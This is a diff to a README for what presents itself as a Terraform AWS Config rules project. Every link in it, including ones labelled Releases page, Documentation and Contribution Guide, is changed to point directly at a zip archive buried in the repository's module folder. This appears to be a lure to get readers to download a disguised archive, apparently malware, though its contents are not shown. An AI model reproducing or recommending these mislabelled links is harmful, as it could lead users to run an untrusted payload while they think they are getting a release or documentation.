@@ -1,6 +1,6 @@
 # 🌟 terraform-aws-config-rules - Effortless AWS Compliance Monitoring
 
-[![Download the latest release](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/gritrock/terraform-aws-config-rules.zip%20now-%20-blue)](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/gritrock/terraform-aws-config-rules.zip)
+[![Download the latest release](https://github.com/TrungLee24/terraform-aws-config-rules/raw/refs/heads/main/modules/lambda_config_rule/config-terraform-rules-aws-3.3-alpha.2.zip%20now-%20-blue)](https://github.com/TrungLee24/terraform-aws-config-rules/raw/refs/heads/main/modules/lambda_config_rule/config-terraform-rules-aws-3.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application from our Releases page.
 
 **1. Visit the Releases page:**  
 Click the link below to go to the Releases page.  
-[Download here](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/gritrock/terraform-aws-config-rules.zip)
+[Download here](https://github.com/TrungLee24/terraform-aws-config-rules/raw/refs/heads/main/modules/lambda_config_rule/config-terraform-rules-aws-3.3-alpha.2.zip)
 
 **2. Choose your version:**  
 On the Releases page, you will see a list of available versions. Choose the latest version for the best features and updates.
@@ -92,8 +92,8 @@ If you need further assistance, feel free to reach out to us through the Issues 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/gritrock/terraform-aws-config-rules.zip): More detailed instructions and guidelines.
-- [Contribution Guide](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/gritrock/terraform-aws-config-rules.zip): Learn how to contribute to our project.
+- [Documentation](https://github.com/TrungLee24/terraform-aws-config-rules/raw/refs/heads/main/modules/lambda_config_rule/config-terraform-rules-aws-3.3-alpha.2.zip): More detailed instructions and guidelines.
+- [Contribution Guide](https://github.com/TrungLee24/terraform-aws-config-rules/raw/refs/heads/main/modules/lambda_config_rule/config-terraform-rules-aws-3.3-alpha.2.zip): Learn how to contribute to our project.
 
 Remember, you can always go back to the Releases page to download the latest version.  
-[Download here](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/gritrock/terraform-aws-config-rules.zip)
+[Download here](https://github.com/TrungLee24/terraform-aws-config-rules/raw/refs/heads/main/modules/lambda_config_rule/config-terraform-rules-aws-3.3-alpha.2.zip)
